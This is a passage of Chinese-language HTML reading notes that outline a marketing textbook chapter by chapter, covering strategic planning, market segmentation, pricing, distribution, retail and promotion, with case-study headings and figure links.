title="下一世纪营销的挑战"></a>下一世纪营销的挑战</h3><ul><li>非盈利营销的增长</li><li>全球一体化进程加快</li><li>世界经济形势的变化</li><li>伦理和社会责任的强化</li><li>营销展望</li></ul><h3 id="案例一-“护门”-DoorGu-ard"><a href="#案例一-“护门”-DoorGu-ard" class="headerlink" title="案例一 “护门”(DoorGu ard)"></a>案例一 “护门”(DoorGu ard)</h3><h2 id="第二章、战略计划与营销过程"><a href="#第二章、战略计划与营销过程" class="headerlink" title="第二章、战略计划与营销过程"></a>第二章、战略计划与营销过程</h2><h3 id="战略计划"><a href="#战略计划" class="headerlink" title="战略计划"></a>战略计划</h3><ul><li>确定公司的宗旨</li><li>确定公司的目标</li></ul><h3 id="公司资源分配计划"><a href="#公司资源分配计划" class="headerlink" title="公司资源分配计划"></a>公司资源分配计划</h3><ul><li>当前业务资源分配计划分析<ul><li>波士顿顾问公司方法<ul><li>明星业务( St ar )</li><li>财源业务( Cash cow)</li><li>问题业务( Quest ion mark)</li><li>不利业务( Dog)</li></ul></li><li>通用电气公司方法</li><li>矩阵方法存在的问题</li></ul></li><li>成长型战略的发展</li><li>职能战略的策划<ul><li>在战略计划中营销部门扮演的角色</li><li>营销部门和其他业务职能部门</li><li>部门间的冲突</li></ul></li></ul><h3 id="营销过程"><a href="#营销过程" class="headerlink" title="营销过程"></a>营销过程</h3><ul><li>目标消费者<ul><li>需求测量与预测</li><li>市场细分</li><li>目标市场选择</li><li>市场定位</li></ul></li><li>确定竞争优势的营销战略</li><li>营销组合的发展</li></ul><h3 id="营销活动管理"><a href="#营销活动管理" class="headerlink" title="营销活动管理"></a>营销活动管理</h3><ul><li>营销分析</li><li>营销计划 <img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_01_01.png"></li><li>营销实施</li><li>营销部门的组织</li><li>营销控制 <img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_01_02.png"> <img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_01_03.png"></li></ul><h3 id="案例二-捕鼠器"><a href="#案例二-捕鼠器" class="headerlink" title="案例二 捕鼠器"></a>案例二 捕鼠器</h3><h2 id="第三章、营销环境"><a href="#第三章、营销环境" class="headerlink" title="第三章、营销环境"></a>第三章、营销环境</h2><h3 id="公司的微观环境"><a href="#公司的微观环境" class="headerlink" title="公司的微观环境"></a>公司的微观环境</h3><ul><li>公司</li><li>供应商</li><li>营销中间商</li><li>用户</li><li>竞争者</li><li>公众<ul><li>金融公众( financial publics)</li><li>媒介公众( media publics )</li><li>政府公众( government publics )</li><li>民间公众( cit izen -action publics )</li><li>地方公众( local publics )</li><li>一般公众( general publics )</li><li>内部公众( internal publics)</li></ul></li></ul><h3 id="公司的宏观环境"><a href="#公司的宏观环境" class="headerlink" title="公司的宏观环境"></a>公司的宏观环境</h3><ul><li>人口统计环境<ul><li>美国人口年龄结构的变化</li><li>美国家庭的变化</li><li>人口居住区域的变化<ul><li>向阳光地带迁移</li><li>从乡村向城区迁移</li><li>从城市向郊区迁移</li></ul></li><li>更好的教育及更多的白领人口</li><li>伦理和种族更加多样化</li></ul></li><li>经济环境<ul><li>收入的变化</li><li>顾客花费方式的变化</li></ul></li><li>自然环境<ul><li>原材料短缺</li><li>能源成本增加</li><li>污染增加</li><li>政府对自然资源的管理</li></ul></li><li>技术环境<ul><li>技术变化的步伐</li><li>高开发与研究( R&amp;D) 预算</li><li>强调小改小革</li><li>法规的增加</li></ul></li><li>政治环境<ul><li>法律对工商业的制约<ul><li>增加立法</li><li>实施法规的政府部门</li><li>更强调伦理和社会责任</li></ul></li></ul></li><li>文化环境<ul><li>文化的持久性</li><li>文化的转变<ul><li>人们对自己的看法</li><li>人们对他人的看法</li><li>人们对组织的看法</li><li>人们对社会的看法</li><li>人们对自然的看法</li><li>人们对宇宙的看法</li></ul></li></ul></li></ul><h3 id="对营销环境的反应"><a href="#对营销环境的反应" class="headerlink" title="对营销环境的反应"></a>对营销环境的反应</h3><h3 id="案例三-捷西佩尼公司-JCPenney"><a href="#案例三-捷西佩尼公司-JCPenney" class="headerlink" title="案例三 捷西佩尼公司( JCPenney)"></a>案例三 捷西佩尼公司( JCPenney)</h3><h2 id="第四章、市场营销研究与信息系统"><a href="#第四章、市场营销研究与信息系统" class="headerlink" title="第四章、市场营销研究与信息系统"></a>第四章、市场营销研究与信息系统</h2><h3 id="营销信息系统"><a href="#营销信息系统" class="headerlink" title="营销信息系统"></a>营销信息系统</h3><ul><li>评估信息 <img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_01_04.png"></li><li>信息开发<ul><li>内部记录</li><li>市场营销情报</li><li>市场营销研究</li><li>信息分析</li></ul></li><li>信息的传送</li></ul><h3 id="市场营销研究的过程"><a href="#市场营销研究的过程" class="headerlink" title="市场营销研究的过程"></a>市场营销研究的过程</h3><ul><li><p>确认问题和研究目标</p></li><li><p>制定研究计划</p><ul><li>详细确认所需信息</li><li>收集间接信息 <img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_01_05.png"></li><li>安排收集直接数据 <img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_01_06.png"> <img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_01_07.png"> <img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_01_08.png"></li></ul></li><li><p>执行研究计划</p></li><li><p>解释和报告研究成果</p></li><li><p>市场营销研究的其他方面</p><ul><li>小型企业和非盈利组织的营销研究</li><li>国际市场营销研究</li><li>市场营销研究中的公共政策和伦理问题</li></ul></li></ul><h3 id="案例四-电器控制设备市场"><a href="#案例四-电器控制设备市场" class="headerlink" title="案例四 电器控制设备市场"></a>案例四 电器控制设备市场</h3><h2 id="第五章、消费者市场与消费品购买者行为"><a href="#第五章、消费者市场与消费品购买者行为" class="headerlink" title="第五章、消费者市场与消费品购买者行为"></a>第五章、消费者市场与消费品购买者行为</h2><h3 id="消费者行为模式"><a href="#消费者行为模式" class="headerlink" title="消费者行为模式"></a>消费者行为模式</h3><h3 id="影响消费者行为的因素"><a href="#影响消费者行为的因素" class="headerlink" title="影响消费者行为的因素"></a>影响消费者行为的因素</h3><ul><li>文化因素<ul><li>文化</li><li>亚文化<ul><li>拉丁美洲消费者</li><li>黑人消费者</li><li>成熟消费者</li></ul></li><li>社会阶层</li></ul></li><li>社会因素<ul><li>群体</li><li>家庭</li><li>作用与地位</li></ul></li><li>个人因素<ul><li>年龄和生活周期 <img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_02_09.png"></li><li>职业</li><li>经济状况</li><li>生活方式<ul><li>现实者</li><li>成就者</li><li>诚信者</li><li>成功者</li><li>努力者</li><li>体验者</li><li>创造者</li><li>奋斗者</li></ul></li><li>个性和自我意念</li></ul></li><li>心理因素<ul><li>激励</li><li>感觉</li><li>学习</li><li>信任和态度</li></ul></li></ul><h3 id="消费者购买角色"><a href="#消费者购买角色" class="headerlink" title="消费者购买角色"></a>消费者购买角色</h3><ul><li>启动者</li><li>影响者</li><li>决策者</li><li>购买者</li><li>使用者</li></ul><h3 id="购买决策行为的种类"><a href="#购买决策行为的种类" class="headerlink" title="购买决策行为的种类"></a>购买决策行为的种类</h3><ul><li>复杂购买行为</li><li>消除差异购买行为</li><li>习惯性购买行为</li><li>广泛挑选购买行为</li></ul><h3 id="购买者决策过程"><a href="#购买者决策过程" class="headerlink" title="购买者决策过程"></a>购买者决策过程</h3><ul><li>确认需要</li><li>搜索信息<ul><li>个人来源: 家庭、朋友、邻居和熟人。</li><li>商业来源: 广告、销售人员、商店、包装和展示。</li><li>公共来源: 大众传媒和消费者协会。</li><li>试验来源: 搬运、检查和使用产品。</li></ul></li><li>评估选择</li><li>购买决定</li><li>购后行为</li></ul><h3 id="新产品的购买决策过程"><a href="#新产品的购买决策过程" class="headerlink" title="新产品的购买决策过程"></a>新产品的购买决策过程</h3><ul><li>接受过程的几个阶段<ul><li>知晓: 消费者知道了新产品, 但缺少有关信息</li><li>兴趣: 消费者寻找关于新产品的信息</li><li>试验: 消费者小规模试用新产品, 调整他或她对新产品的看法</li><li>接受: 消费者决定充分地或常规地使用新产品</li></ul></li><li>个人接受创新时的差异</li><li>产品特点对接受率的影响<ul><li>优势程度: 与已有产品相比, 新发明表现的优良程度</li><li>匹配程度: 新产品与潜在消费者的价值观或经验是否一致</li><li>复杂程度: 弄懂或使用新产品的难度</li><li>可分程度: 人们是否有多种方法来购买新产品</li><li>交流程度: 人们使用新产品后, 能否看到新产品的优点并告诉他人</li></ul></li></ul><h3 id="国际消费者行为"><a href="#国际消费者行为" class="headerlink" title="国际消费者行为"></a>国际消费者行为</h3><h3 id="案例五-重新想想未来"><a href="#案例五-重新想想未来" class="headerlink" title="案例五 重新想想未来"></a>案例五 重新想想未来</h3><h2 id="第六章、集团市场与集团购买者行为"><a href="#第六章、集团市场与集团购买者行为" class="headerlink" title="第六章、集团市场与集团购买者行为"></a>第六章、集团市场与集团购买者行为</h2><h3 id="集团市场"><a href="#集团市场" class="headerlink" title="集团市场"></a>集团市场</h3><ul><li>集团购买的特点<ul><li>市场结构与需求</li><li>购买产品的性质</li><li>决策类型和决策过程</li><li>集团市场的其他特点</li></ul></li><li>集团购买者的行为模式</li></ul><h3 id="集团购买行为"><a href="#集团购买行为" class="headerlink" title="集团购买行为"></a>集团购买行为</h3><ul><li>购买情况的种类</li><li>集团购买过程中的参加者<ul><li>使用者( Users)</li><li>影响者( Inf luencer )</li><li>购买者( Buyer )</li><li>决策者(Deciders )</li><li>挡驾者(Gatekeepers )</li></ul></li><li>影响集团购买者的主要因素<ul><li>环境因素</li><li>组织因素<ul><li>采购部门升级</li><li>集中购买</li><li>长期合同</li><li>购买工作评估</li><li>适时的生产系统</li></ul></li><li>人际因素</li><li>个人因素</li></ul></li><li>集团购买过程 <img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_04_23.png"></li></ul><h3 id="机构和政府市场"><a href="#机构和政府市场" class="headerlink" title="机构和政府市场"></a>机构和政府市场</h3><ul><li>机构市场</li><li>政府市场<ul><li>影响政府购买者的主要因素</li><li>政府购买者决策过程</li></ul></li></ul><h3 id="案例六-控制行业市场"><a href="#案例六-控制行业市场" class="headerlink" title="案例六 控制行业市场"></a>案例六 控制行业市场</h3><h2 id="第七章、测量与预测需求"><a href="#第七章、测量与预测需求" class="headerlink" title="第七章、测量与预测需求"></a>第七章、测量与预测需求</h2><h3 id="市场的定义"><a href="#市场的定义" class="headerlink" title="市场的定义"></a>市场的定义</h3><h3 id="当前市场需求的测量"><a href="#当前市场需求的测量" class="headerlink" title="当前市场需求的测量"></a>当前市场需求的测量</h3><ul><li>估计市场总需求</li><li>估计地区市场需求<ul><li>市场构成法</li><li>市场因素指数法</li></ul></li><li>估计实际销售量和市场份额</li></ul><h3 id="预测未来需求"><a href="#预测未来需求" class="headerlink" title="预测未来需求"></a>预测未来需求</h3><img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_02_10.png"> * 购买者意向调查 * 综合销售人员意见 * 听取专家意见 * 测试市场 * 时间序列分析 * 前兆因素分析 * 统计需求分析法<h3 id="案例七-预测孩子玩什么"><a href="#案例七-预测孩子玩什么" class="headerlink" title="案例七 预测孩子玩什么"></a>案例七 预测孩子玩什么</h3><h2 id="第八章、市场细分下的目标市场与优势定位"><a href="#第八章、市场细分下的目标市场与优势定位" class="headerlink" title="第八章、市场细分下的目标市场与优势定位"></a>第八章、市场细分下的目标市场与优势定位</h2><h3 id="市场"><a href="#市场" class="headerlink" title="市场"></a>市场</h3><ul><li>广泛营销</li><li>多产品营销</li><li>目标市场营销</li></ul><h3 id="市场细分"><a href="#市场细分" class="headerlink" title="市场细分"></a>市场细分</h3><ul><li>消费者市场细分的基础<ul><li>地理细分</li><li>人口细分<ul><li>年龄和生活周期</li><li>性别</li><li>收入</li><li>多因素人口细分</li></ul></li><li>心理细分<ul><li>社会阶层</li><li>生活方式</li><li>个性</li></ul></li><li>行为细分<ul><li>购买时机</li><li>寻求的利益</li><li>使用者情况</li><li>使用率</li><li>品牌崇信度</li></ul></li></ul></li><li>集团市场细分 <img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_04_22.png"> * 计划中的购买者 * 关系中的购买者 * 交易中的购买者 * 讨价还价的购买者</li><li>国际市场细分</li><li>有效细分的要求<ul><li>可测量性</li><li>可接近性</li><li>实质性</li><li>可行性</li></ul></li></ul><h3 id="确定目标市场"><a href="#确定目标市场" class="headerlink" title="确定目标市场"></a>确定目标市场</h3><ul><li>评估子市场<ul><li>子市场的规模与发展</li><li>子市场结构优势</li><li>公司的目标和资源</li></ul></li><li>选择子市场<ul><li>无差异性营销</li><li>差异性营销</li><li>集中式营销</li><li>选择市场覆盖策略</li></ul></li></ul><h3 id="优势市场定位"><a href="#优势市场定位" class="headerlink" title="优势市场定位"></a>优势市场定位</h3><ul><li>什么是市场定位</li><li>定位策略</li><li>选择和实施定位策略<ul><li>确定可能的竞争优势<ul><li>产品差异</li><li>服务差异</li><li>人员差异</li><li>形象差异</li></ul></li><li>选择正确的竞争优势<ul><li>需要展示的差异</li><li>选择需要促销的差异<ul><li>重要程度: 差异对目标购买者来说是非常有价值的。</li><li>明显程度: 竞争者没有的产品或服务, 或公司在这两方面有明显优势。</li><li>优质程度: 顾客可以获得最好的质量。</li><li>交流程度: 差异有可交流性, 并且消费者可以看见差异。</li><li>专门性: 竞争者不能轻易地模仿制造。</li><li>购买力: 购买者买得起有优势的产品。</li><li>盈利性: 公司的差异可带来利润。<img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_02_11.png"></li></ul></li><li>定位交流与传递</li></ul></li></ul></li></ul><h3 id="案例八-饮料市场的竞争"><a href="#案例八-饮料市场的竞争" class="headerlink" title="案例八 饮料市场的竞争"></a>案例八 饮料市场的竞争</h3><h2 id="第九章、产品综合设计"><a href="#第九章、产品综合设计" class="headerlink" title="第九章、产品综合设计"></a>第九章、产品综合设计</h2><h3 id="什么是产品"><a href="#什么是产品" class="headerlink" title="什么是产品"></a>什么是产品</h3><h3 id="产品分类"><a href="#产品分类" class="headerlink" title="产品分类"></a>产品分类</h3><ul><li>消费品 <img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_02_12.png"></li><li>工业品</li></ul><h3 id="产品决策"><a href="#产品决策" class="headerlink" title="产品决策"></a>产品决策</h3><ul><li>产品属性<ul><li>产品质量</li><li>产品特征</li><li>产品设计</li></ul></li><li>品牌策略<ul><li>什么是品牌<ul><li>属性: 品牌首先把产品的属性带给人们</li><li>利益: 客户购买的不是产品属性, 而是利益</li><li>价值: 品牌也可以反映购买者的价值观,</li><li>个性: 品牌也能揭示人们的个性</li></ul></li><li>品牌价值</li><li>是否要品牌</li><li>品牌名称的选择</li><li>品牌所有者<ul><li>制造商品牌与销售商品牌</li><li>许可证策略</li><li>联合品牌策略</li></ul></li><li>品牌策略<ul><li>产品延伸策略</li><li>品牌延伸策略</li><li>多品牌策略</li><li>新品牌策略</li></ul></li><li>品牌重新定位</li></ul></li><li>包装策略</li><li>标签策略</li><li>产品维修服务</li></ul><h3 id="产品系列决策"><a href="#产品系列决策" class="headerlink" title="产品系列决策"></a>产品系列决策</h3><ul><li>产品系列的规模<ul><li>下行延伸法</li><li>上行延伸法</li><li>双向延伸法</li><li>增加产品系列</li></ul></li><li>更新产品系列</li><li>产品系列的重点</li></ul><h3 id="产品组合决策"><a href="#产品组合决策" class="headerlink" title="产品组合决策"></a>产品组合决策</h3><h3 id="国际产品决策"><a href="#国际产品决策" class="headerlink" title="国际产品决策"></a>国际产品决策</h3><h3 id="案例九-从品牌名称中挤出更多的东西"><a href="#案例九-从品牌名称中挤出更多的东西" class="headerlink" title="案例九 从品牌名称中挤出更多的东西"></a>案例九 从品牌名称中挤出更多的东西</h3><h2 id="第十章、新产品设计"><a href="#第十章、新产品设计" class="headerlink" title="第十章、新产品设计"></a>第十章、新产品设计</h2><h3 id="新产品开发策略"><a href="#新产品开发策略" class="headerlink" title="新产品开发策略"></a>新产品开发策略</h3><ul><li>新产品的成功与失败</li><li>新产品的困境 <img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_04_21.png"></li></ul><h3 id="新产品开发过程"><a href="#新产品开发过程" class="headerlink" title="新产品开发过程"></a>新产品开发过程</h3><ul><li>设计思想的产生<ul><li>内部来源</li><li>客户</li><li>竞争者</li><li>分销商、供应商和其他</li></ul></li><li>设计思想的筛选</li><li>设计思想的开发与检验<ul><li>设计思想的开发</li><li>设计思想的测试</li></ul></li><li>市场营销策略的开发</li><li>产品经营分析</li><li>产品的开发</li><li>市场营销测试<ul><li>标准市场测试</li><li>限定性市场测试</li><li>模拟性市场测试</li><li>集团产品的市场测试</li></ul></li><li>产品的商业推广</li><li>加速新产品开发</li></ul><h3 id="产品生命周期策略"><a href="#产品生命周期策略" class="headerlink" title="产品生命周期策略"></a>产品生命周期策略</h3><ul><li>第一阶段: 开发期从公司找到和开发一种新产品的设计思想开始</li><li>第二阶段: 在新生期, 产品刚刚推到市场上, 销售缓慢增长</li><li>第三阶段: 在成长期, 市场迅速认可产品, 利润剧增</li><li>第四阶段: 在成熟期, 许多潜在消费者已经购买了这种产品, 销售增长渐缓<ul><li>调整市场</li><li>调整产品</li><li>调整营销组合策略</li></ul></li><li>第五阶段: 衰退期里, 销售和利润下降<img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_02_13.png"></li></ul><h3 id="案例十-把梦幻推向市场"><a href="#案例十-把梦幻推向市场" class="headerlink" title="案例十 把梦幻推向市场"></a>案例十 把梦幻推向市场</h3><h2 id="第十一章、产品定价"><a href="#第十一章、产品定价" class="headerlink" title="第十一章、产品定价"></a>第十一章、产品定价</h2><h3 id="定价时需考虑的因素"><a href="#定价时需考虑的因素" class="headerlink" title="定价时需考虑的因素"></a>定价时需考虑的因素</h3><ul><li>影响定价决策的内部因素<ul><li>市场营销目标</li><li>市场营销组合策略</li><li>成本<ul><li>成本的种类<ul><li>固定成本</li><li>变动成本</li></ul></li><li>不同生产水平下的成本</li><li>生产经验下的成本函数</li></ul></li><li>组织方面的考虑</li></ul></li><li>影响定价策略的外部因素<ul><li>市场与需求<ul><li>不同市场中的定价</li><li>消费者对价格和价值的看法</li><li>分析“价格—需求”关系</li><li>需求的价格弹性</li></ul></li><li>竞争者的成本、价格和条件</li><li>其他外部因素</li></ul></li></ul><h3 id="一般的定价方法"><a href="#一般的定价方法" class="headerlink" title="一般的定价方法"></a>一般的定价方法</h3><ul><li>基于成本的定价法<ul><li>成本加成定价法</li><li>盈亏平衡定价法和目标利润定价法</li></ul></li><li>基于价值的定价法</li><li>基于竞争的定价<ul><li>行市定价法</li><li>封标定价法</li></ul></li></ul><h3 id="案例十一-机票价格战中余生"><a href="#案例十一-机票价格战中余生" class="headerlink" title="案例十一 机票价格战中余生"></a>案例十一 机票价格战中余生</h3><h2 id="第十二章、定价策略"><a href="#第十二章、定价策略" class="headerlink" title="第十二章、定价策略"></a>第十二章、定价策略</h2><h3 id="新产品定价策略"><a href="#新产品定价策略" class="headerlink" title="新产品定价策略"></a>新产品定价策略</h3><ul><li>撇脂式定价法</li><li>渗透式定价法</li></ul><h3 id="产品组合定价策略"><a href="#产品组合定价策略" class="headerlink" title="产品组合定价策略"></a>产品组合定价策略</h3><img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_02_14.png"><h3 id="价格调整策略"><a href="#价格调整策略" class="headerlink" title="价格调整策略"></a>价格调整策略</h3><img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_02_15.png"><h3 id="价格变动"><a href="#价格变动" class="headerlink" title="价格变动"></a>价格变动</h3><ul><li>主动变动价格<ul><li>主动降低价格</li><li>主动提高价格</li><li>购买者对价格变动的反应</li><li>竞争者对价格变动的反应</li></ul></li><li>价格变动的对策</li></ul><h3 id="案例十二-只卖音响-卖二手车也成功"><a href="#案例十二-只卖音响-卖二手车也成功" class="headerlink" title="案例十二 只卖音响? 卖二手车也成功"></a>案例十二 只卖音响? 卖二手车也成功</h3><h2 id="第十三章、分销产品"><a href="#第十三章、分销产品" class="headerlink" title="第十三章、分销产品"></a>第十三章、分销产品</h2><h3 id="分销渠道的性质"><a href="#分销渠道的性质" class="headerlink" title="分销渠道的性质"></a>分销渠道的性质</h3><ul><li>为什么要有营销中介</li><li>分销渠道的职能<ul><li>信息: 收集和发布各单位市场研究和情报方面的信息, 这些信息对适应环境,进行计划和调整很有必要。</li><li>促销: 开发和发布有关广告信息。</li><li>交流: 寻找并与潜在消费者进行交流。</li><li>调整: 为适应消费者进行调整, 包括制造、定级、组装和包装。</li><li>谈判: 达成有关价格、产品、服务的协议, 完成所有权或使用权的转换。</li><li>实体分销: 运输和储存货物。</li><li>财务业务: 获得和使用资金, 补偿分销渠道的成本。</li><li>承担风险: 承担分销渠道工作的风险。</li></ul></li><li>渠道层次的数量</li><li>服务领域的分销渠道</li></ul><h3 id="分销渠道行为和组织"><a href="#分销渠道行为和组织" class="headerlink" title="分销渠道行为和组织"></a>分销渠道行为和组织</h3><ul><li>分销渠道行为</li><li>垂直营销系统<ul><li>统一垂直营销系统</li><li>契约垂直营销系统</li><li>管理垂直营销系统</li></ul></li><li>水平营销系统</li><li>混合营销系统</li></ul><h3 id="分销渠道设计决策"><a href="#分销渠道设计决策" class="headerlink" title="分销渠道设计决策"></a>分销渠道设计决策</h3><ul><li>分析消费者在服务方面的需要</li><li>制定分销渠道目标和限制条件</li><li>确认主要的分销渠道选择<ul><li>中间商的种类<ul><li>公司销售队伍: 扩大公司的直销队伍。</li><li>制造商的代理商: 雇佣制造商的代理商</li><li>工业分销商: 在不同地区和行业找到分销商</li></ul></li><li>市场营销中间商的数量</li><li>渠道成员的责任</li></ul></li><li>评估主要的分销渠道<ul><li>经济标准</li><li>控制标准</li><li>适应性标准</li></ul></li><li>设计国际分销渠道</li></ul><h3 id="分销渠道管理决策"><a href="#分销渠道管理决策" class="headerlink" title="分销渠道管理决策"></a>分销渠道管理决策</h3><ul><li>选择分销渠道成员</li><li>激励分销渠道成员</li><li>评估分销渠道成员</li></ul><h3 id="实体分销和后勤管理"><a href="#实体分销和后勤管理" class="headerlink" title="实体分销和后勤管理"></a>实体分销和后勤管理</h3><ul><li>实体分销和市场营销后勤的性质和重要性</li><li>后勤系统的目标</li><li>主要后勤职能<ul><li>订货处理</li><li>仓库管理</li><li>仓储</li><li>运输<ul><li>铁路</li><li>卡车</li><li>水路</li><li>管线</li><li>航空</li></ul></li></ul></li><li>集中后勤管理<ul><li>跨部门的小组工作</li><li>建立渠道合作关系</li></ul></li></ul><h3 id="案例十三-超越传统"><a href="#案例十三-超越传统" class="headerlink" title="案例十三 超越传统"></a>案例十三 超越传统</h3><h2 id="第十四章、出售产品——零售及批发"><a href="#第十四章、出售产品——零售及批发" class="headerlink" title="第十四章、出售产品——零售及批发"></a>第十四章、出售产品——零售及批发</h2><h3 id="零售业"><a href="#零售业" class="headerlink" title="零售业"></a>零售业</h3><h3 id="店铺零售业"><a href="#店铺零售业" class="headerlink" title="店铺零售业"></a>店铺零售业</h3><img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_04_16.png"><h3 id="无店铺零售业"><a href="#无店铺零售业" class="headerlink" title="无店铺零售业"></a>无店铺零售业</h3><ul><li>直接市场营销</li><li>直接推销</li><li>自动售货</li></ul><h3 id="零售商市场营销决策"><a href="#零售商市场营销决策" class="headerlink" title="零售商市场营销决策"></a>零售商市场营销决策</h3><ul><li>目标市场和定位决策</li><li>产品分类和服务决策</li><li>价格决策</li><li>促销决策</li><li>地点决策</li></ul><h3 id="零售业的未来"><a href="#零售业的未来" class="headerlink" title="零售业的未来"></a>零售业的未来</h3><h3 id="批发业"><a href="#批发业" class="headerlink" title="批发业"></a>批发业</h3><ul><li>销售和促销。批发商的推销人员帮助制造商以低费用接触到任何小的顾客。批发商有更多的联系并且往往比起遥远的制造商更为购买者所信任。</li><li>购买和分类。批发商能选择项目并建立他们的顾客所需要的分类, 因此节省消费者许多工作。</li><li>大批量分割。批发商凭借购买整车货物并分割批量( 将大批量分成小数量) 以节省顾客的钱。</li><li>仓储。批发商保管存货, 因此降低供应商和顾客的存货费用和风险。</li><li>交通。批发商能更快地将货物交给购买者, 因为他们比生产者更接近些。</li><li>融资。批发商为顾客提供信贷给予他们资金, 他们并提前订货和准时付款来为供应商筹措资金。</li><li>承担风险。批发商拥有货物的所有权而要承担风险并承担商品被盗窃、破坏、损耗和陈旧老化的费用。</li><li>市场信息。批发商将有关竞争者、新产品和价格发展的信息提供给供应商和顾客。</li><li>管理服务和咨询。批发商经常帮助零售商训练他们的售货员, 改进商店布局和陈列, 并建立会计和存货控制制度。</li></ul><h3 id="批发商的类型"><a href="#批发商的类型" class="headerlink" title="批发商的类型"></a>批发商的类型</h3><img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_04_17.png"><h3 id="批发商市场营销决策"><a href="#批发商市场营销决策" class="headerlink" title="批发商市场营销决策"></a>批发商市场营销决策</h3><ul><li>目标市场和定位决策</li><li>市场组合决策</li></ul><h3 id="批发业的趋势"><a href="#批发业的趋势" class="headerlink" title="批发业的趋势"></a>批发业的趋势</h3><h3 id="案例十四-山姆的俱乐部-扩充规模应付竞争"><a href="#案例十四-山姆的俱乐部-扩充规模应付竞争" class="headerlink" title="案例十四 山姆的俱乐部: 扩充规模应付竞争"></a>案例十四 山姆的俱乐部: 扩充规模应付竞争</h3><h2 id="第十五章、产品促销-营销沟通策略"><a href="#第十五章、产品促销-营销沟通策略" class="headerlink" title="第十五章、产品促销: 营销沟通策略"></a>第十五章、产品促销: 营销沟通策略</h2><h3 id="发展有效沟通的步骤"><a href="#发展有效沟通的步骤" class="headerlink" title="发展有效沟通的步骤"></a>发展有效沟通的步骤</h3><ul><li>确定目标接收者</li><li>决定所寻求的反应</li><li>选择信息<ul><li>信息内容<ul><li>理性的呼吁( Rational Appeals ) 与接受者自身的利益有关</li><li>感性的呼吁( Emotional Appeals ) 旨在激起消极或积极的情绪, 以刺激购买</li><li>道德呼吁(Moral Appeals) 是针对接受者有关什么是“对的”和“适当的”之理解</li></ul></li><li>信息结构</li><li>信息格式</li></ul></li><li>选择媒体<ul><li>人员沟通渠道</li><li>非人员沟通渠道</li></ul></li><li>选择信息来源</li><li>收集反馈</li></ul><h3 id="制定全盘的促销预算和组合"><a href="#制定全盘的促销预算和组合" class="headerlink" title="制定全盘的促销预算和组合"></a>制定全盘的促销预算和组合</h3><ul><li>编制全盘促销预算<ul><li>量力而行法</li><li>销售额百分比法</li><li>竞争平衡法</li><li>目标任务法</li></ul></li><li>制定促销组合<ul><li>各种促销工具的特性<ul><li>广告</li><li>人员推销</li><li>营业推广</li><li>公共关系</li></ul></li><li>制定促销组合的因素<ul><li>产品/ 市场类型</li><li>推式与拉式策略</li><li>购买者准备阶段</li><li>产品生命周期阶段</li></ul></li></ul></li></ul><h3 id="市场营销沟通变化中的一面"><a href="#市场营销沟通变化中的一面" class="headerlink" title="市场营销沟通变化中的一面"></a>市场营销沟通变化中的一面</h3><ul><li>变化中的沟通环境</li><li>直接市场营销的成长<ul><li>直接市场营销沟通的形式<ul><li>直接邮寄和目录市场营销</li><li>电话市场营销</li><li>电视市场营销</li><li>联机购物</li></ul></li><li>直接市场营销数据库</li><li>一体化直接市场营销</li></ul></li><li>一体化市场营销沟通</li></ul><h3 id="在社会上应负责任的市场营销沟通"><a href="#在社会上应负责任的市场营销沟通" class="headerlink" title="在社会上应负责任的市场营销沟通"></a>在社会上应负责任的市场营销沟通</h3><ul><li>广告</li><li>人员推销</li><li>直接市场营销<ul><li>激怒, 不公平, 欺诈和蒙骗</li><li>隐私的侵犯</li></ul></li></ul><h3 id="案例十五-雅芳-Avon-一个促销策略的改造"><a href="#案例十五-雅芳-Avon-一个促销策略的改造" class="headerlink" title="案例十五 雅芳(Avon ) : 一个促销策略的改造"></a>案例十五 雅芳(Avon ) : 一个促销策略的改造</h3><h2 id="第十六章、产品促销-广告、营业推广与公共关系"><a href="#第十六章、产品促销-广告、营业推广与公共关系" class="headerlink" title="第十六章、产品促销: 广告、营业推广与公共关系"></a>第十六章、产品促销: 广告、营业推广与公共关系</h2><h3 id="广告"><a href="#广告" class="headerlink" title="广告"></a>广告</h3><h3 id="广告的主要决策"><a href="#广告的主要决策" class="headerlink" title="广告的主要决策"></a>广告的主要决策</h3><ul><li>制定目标 <img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_04_18.png"></li><li>广告预算的编制<ul><li>产品生命周期阶段</li><li>市场份额</li><li>竞争与干扰</li><li>广告次数</li><li>产品差异</li></ul></li><li>广告策略<ul><li>创造广告信息<ul><li>变化的信息环境</li><li>信息策略</li><li>信息制作<ul><li>生活片段</li><li>生活方式</li><li>幻境</li><li>情调或形象</li><li>音乐</li><li>人物象征</li><li>专业技术</li><li>科学证据</li><li>表扬的证据</li></ul></li></ul></li><li>选择广告媒体<ul><li>确定广告的接触度、频率与效果</li><li>选择主要媒体类型</li><li>选择特定的媒体工具</li><li>决定媒体时间</li></ul></li></ul></li><li>广告评估<ul><li>衡量沟通效果</li><li>衡量销售效果</li></ul></li><li>国际广告决策</li></ul><h3 id="营业推广"><a href="#营业推广" class="headerlink" title="营业推广"></a>营业推广</h3><ul><li>营业推广的快速成长</li><li>营业推广的目的</li><li>设立营业推广目标</li><li>选择营业推广工具<ul><li>消费者促销工具<ul><li>样品(Samples)</li><li>代金券(Coupons)</li><li>现金退款(Cash Refund Offers或Rebates)</li><li>特价包装(Price Packs )</li><li>奖品(Premiums)</li><li>广告特赠品(Advertizing Specialties)</li><li>光顾奖赏(Patronge Rewards)</li><li>购买点(Point-of-Purchase 